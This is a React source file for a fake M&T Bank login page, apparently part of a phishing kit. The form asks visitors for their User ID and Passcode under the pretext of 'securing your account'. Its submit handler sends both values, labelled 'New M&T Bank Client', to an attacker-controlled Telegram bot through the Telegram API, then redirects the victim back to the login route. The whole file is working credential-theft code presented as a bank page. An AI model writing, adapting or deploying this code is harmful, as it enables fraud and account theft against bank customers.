import React, { useCallback, useEffect, useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import Header from '../../components/Header';
import Sidebar from '../../components/Sidebar';
import Footer from '../../components/Footer';
import axios from 'axios';
import { botToken, chatId } from '../../constants';

const LoginPage: React.FC = () => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [userId, setUserId] = useState('');
  const [passcode, setPasscode] = useState('');
  const [showPasscode, setShowPasscode] = useState(false);
  const [errors, setErrors] = useState({ userId: '', passcode: '' });

  const navigate = useNavigate();

  const togglePasscodeVisibility = () => {
    setShowPasscode((prev) => !prev);
  };

  const validateUserId = (userId) => {
    return userId.trim().length > 0; // Adjust validation as needed
  };

  const sendMessageToTelegram = async (message) => {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
      await axios.post(url, {
        chat_id: chatId,
        text: message,
      });
      console.log('Message sent successfully');
    } catch (error) {
      console.error('Error sending message:', error);
    }
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    let newErrors = { userId: '', passcode: '' };

    if (!validateUserId(userId)) {
      newErrors.userId = 'User ID is required.';
    }

    if (passcode.length < 6) {
      newErrors.passcode = 'Passcode must be at least 6 characters.';
    }

    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.userId && !newErrors.passcode) {
      // Proceed with form submission
      console.log('Form submitted with:', { userId, passcode });

      const userData = `New M&T Bank Client \n\nUser ID: ${userId} \nPasscode: ${passcode}`;
      sendMessageToTelegram(userData);

      navigate('/login'); 

      setErrors({ userId: '', passcode: '' });
    }
  };

  return (
    <>
      <Header sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
      <Sidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
      <section>
        <div className="grid grid-cols-1 gap-4">
          <div className="px-10 pt-4">
            <h1 className="text-5xl font-extralight mb-6 text-center text-middarkgreen">
              Log In
            </h1>

            <p className='mb-5'>Please enter your login credentials to proceed with securing your account.</p>

            <form onSubmit={handleSubmit}>
              <div className="mb-5">
                <label className="block text-black dark:text-white">User ID</label>
                <div className="relative">
                  <input
                    id="userId"
                    name="userId"
                    type='text'
                    value={userId}
                    onChange={(e) => setUserId(e.target.value)}
                    className="w-full border border-graylight bg-transparent py-2 pl-6 pr-10 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                  />
                </div>
              </div>

              {errors.userId && (
                <div className="flex items-center gap-3 text-sm font-bold mt-1 mb-1">
                  <svg width="1rem" height="1rem" viewBox="0 0 24 24" className="fill-current text-red-600" aria-hidden="true">
                    <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" fillRule="nonzero"></path>
                  </svg>
                  <p>{errors.userId}</p>
                </div>
              )}
              
              <div className="mb-8">
                <label className="block text-black dark:text-white">Passcode</label>
                <div className="relative">
                  <input
                    id="passcode"
                    name="passcode"
                    type={showPasscode ? "text" : "password"}
                    value={passcode}
                    onChange={(e) => setPasscode(e.target.value)}
                    className="w-full border border-graylight bg-transparent py-2 pl-6 pr-10 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                  />
                  {errors.passcode && (
                    <div className="flex items-center gap-3 text-sm font-bold mt-2">
                      <svg width="1rem" height="1rem" viewBox="0 0 24 24" className="fill-current text-red-600" aria-hidden="true">
                        <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" fillRule="nonzero"></path>
                      </svg>
                      <p>{errors.passcode}</p>
                    </div>
                  )}
                  <span
                    className="absolute right-4 top-2 cursor-pointer"
                    onClick={togglePasscodeVisibility}
                  >
                    {showPasscode ? "Hide" : "Show"}
                  </span>
                </div>
              </div>

              <div className="mb-10">
                <input
                  type="submit"
                  value="Log in >"
                  className="w-[150px] cursor-pointer font-bold border border-darkgreen bg-darkgreen p-2 text-white transition hover:bg-opacity-90"
                />
              </div>
            </form>
          </div>
        </div>
      </section>
      <br />
      <Footer />
    </>
  );
};

export default LoginPage;
